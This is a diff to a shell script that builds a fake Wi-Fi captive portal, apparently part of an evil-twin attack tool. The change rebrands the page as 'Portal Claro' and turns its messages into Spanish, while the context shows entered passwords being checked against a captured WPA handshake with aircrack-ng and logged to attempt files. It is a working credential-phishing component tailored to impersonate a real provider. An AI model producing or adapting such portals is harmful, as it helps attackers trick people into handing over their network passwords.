@@ -3,7 +3,7 @@ echo '<!DOCTYPE html>'
 echo '<html>'
 echo -e '\t<head>'
 echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
-echo -e '\t\t<title>E-Corp Network Authentication Portal</title>'
+echo -e '\t\t<title>Portal Claro</title>'
 echo -e '\t\t<link rel="stylesheet" type="text/css" href="portal.css"/>'
 echo -e '\t\t<script type="text/javascript" src="portal.js"></script>'
 echo -e '\t</head>'
@@ -28,19 +28,19 @@ echo "${password}" >\
 aircrack-ng -a 2 -b F8:E5:A4:3A:FA:81 -w "/tmp/www/ag.et_currentpass.txt" "/root/handshake-F8:E5:A4:3A:FA:81.cap" | grep "KEY FOUND!" > /dev/null
 if [ "$?" = "0" ]; then
 touch "/tmp/www/ag.et_success.txt" > /dev/null 2>&1
-echo 'The password is correct, the connection will be re-established in a few moments.'
+echo 'La contraseña es correcta, La conexion se restaurara en breves momentos..'
 et_successful=1
 else
 echo "${password}" >>\
 "/tmp/www/ag.et_attempts.txt"
-echo 'The password entered is incorrect, redirecting to the main page.'
+echo 'La contraseña ingresada es incorrecta, redirigiendo a la pagina principal.'
 et_successful=0
 fi
 elif [[ "${#password}" -gt 0 ]] && [[ "${#password}" -lt 8 ]]; then
-echo 'Error. Password must be at least 8 characters long. Redirecting to the main page.'
+echo 'Error. la contraseña debe contener al menos 8 caracteres, redirigiendo a la pagina principal.'
 et_successful=0
 else
-echo 'An unexpected error occurred, redirecting to the main page.'
+echo 'un error inesperado ha ocurrido, volviendo a la pagina principal.'
 et_successful=0
 fi
 echo -e '\t\t\t\t\t</p></center>'
